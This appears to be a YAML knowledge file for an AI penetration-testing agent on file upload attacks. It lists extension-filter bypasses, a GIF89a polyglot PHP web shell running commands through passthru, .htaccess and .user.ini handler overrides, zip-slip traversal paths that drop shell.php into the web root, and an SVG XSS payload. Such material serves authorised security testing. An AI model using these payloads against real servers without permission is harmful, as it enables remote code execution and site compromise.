  - zip slip
  - mime type
  - avatar upload
  - dosya yükleme
tools:
  - curl
knowledge: |
  Assess file upload attack surfaces systematically like a senior red-team operator across extension parsing, MIME checks, and handler configurations.

  1. EXTENSION FILTERING BYPASS MATRIX:
     When standard `.php`, `.jsp`, or `.aspx` extensions are blocked:
     • Alternative Executable Extensions:
       PHP: `.php3`, `.php4`, `.php5`, `.php7`, `.pht`, `.phtml`, `.phar`, `.inc`
       Java: `.jspx`, `.jspf`, `.war`
       ASP.NET: `.ashx`, `.asmx`, `.asp`, `.cer`, `.asa`
     • Case Variation & Mixed-Casing: `.pHp`, `.PhAr`, `.pHTML`, `.aSpX`
     • Double Extensions: `report.jpg.php`, `avatar.png.phtml`
     • Path and Trailing Byte Obfuscation:
       Trailing dot/space: `shell.php.`, `shell.php `
       NTFS Alternate Data Streams (IIS): `shell.php::$DATA`

  2. MIME MAGIC-BYTE SPOOFING & POLYGLOTS:
     When server validates content headers using magic bytes:
     • GIF89a Polyglot:
       Prepend `GIF89a;` to payload while setting `Content-Type: image/gif`:
       `GIF89a; <?php echo passthru($_GET['c']); ?>`
     • JPEG Polyglot:
       Embed payload within EXIF metadata comments using jpegsnoop or raw hex prepending (`\xFF\xD8\xFF\xE0`).

  3. SERVER HANDLER & CONFIGURATION OVERRIDES:
     When file uploads land inside the web directory:
     • Apache `.htaccess` Override:
       Upload a file named `.htaccess` containing:
       `AddType application/x-httpd-php .jpg`
       Then upload and request `payload.jpg`.
     • PHP-FPM `.user.ini` Override:
       Upload `.user.ini` containing:
       `auto_prepend_file=image.jpg`
       Forces every PHP script in that directory to include and execute `image.jpg`.

  4. ARCHIVE EXTRACTION VULNERABILITIES (ZIP SLIP):
     When the application accepts `.zip`, `.tar.gz`, or `.rar` for extraction:
     • Craft zip archive containing entries with directory traversal paths:
       `../../../../var/www/html/shell.php`
     • If extraction does not sanitize relative paths, the file overwrites web root assets.

  5. CLIENT-SIDE STORED XSS (SVG VECTORS):
     When image uploads are accepted and served directly:
     • Upload SVG with embedded JavaScript:
       `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>`
     • If served without `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`, script executes in browser context.
